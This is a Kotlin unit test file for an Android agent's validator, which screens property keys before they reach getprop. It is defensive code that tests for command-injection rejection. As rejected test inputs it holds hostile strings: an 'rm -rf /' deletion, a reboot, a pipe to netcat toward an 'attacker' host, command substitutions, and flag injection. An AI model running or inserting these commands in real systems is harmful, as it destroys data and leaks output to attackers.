package com.camremote.core.logic

import com.camremote.core.protocol.InvalidParamsException
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith

/**
 * The agent reads properties by running `getprop`, so a key coming off the network becomes an
 * argument to a process. It is never passed through a shell, but validating it anyway costs one
 * regex and removes the whole question.
 */
class PropertyKeysTest {

    @Test
    fun `accepts ordinary android property names`() {
        listOf(
            "ro.product.model",
            "ro.build.version.sdk",
            "persist.sys.timezone",
            "dalvik.vm.heapsize",
            "net.dns1",
            "sys.boot_completed",
            "ro.hardware.chipname-1",
        ).forEach { assertEquals(it, PropertyKeys.validate(it)) }
    }

    @Test
    fun `trims incidental whitespace`() {
        assertEquals("ro.product.model", PropertyKeys.validate("  ro.product.model  "))
    }

    @Test
    fun `rejects an empty key`() {
        assertFailsWith<InvalidParamsException> { PropertyKeys.validate("") }
        assertFailsWith<InvalidParamsException> { PropertyKeys.validate("   ") }
    }

    @Test
    fun `rejects shell metacharacters`() {
        listOf(
            "ro.product.model; rm -rf /",
            "ro.product.model && reboot",
            "ro.product.model | nc attacker 1234",
            "\$(whoami)",
            "`id`",
            "ro.product.model\nro.serialno",
        ).forEach { key ->
            assertFailsWith<InvalidParamsException>("expected '$key' to be rejected") {
                PropertyKeys.validate(key)
            }
        }
    }

    @Test
    fun `rejects argument injection into the getprop invocation`() {
        // A leading dash would be read as a flag rather than a property name.
        assertFailsWith<InvalidParamsException> { PropertyKeys.validate("--help") }
    }

    @Test
    fun `rejects an absurdly long key`() {
        assertFailsWith<InvalidParamsException> { PropertyKeys.validate("ro." + "x".repeat(200)) }
    }
}
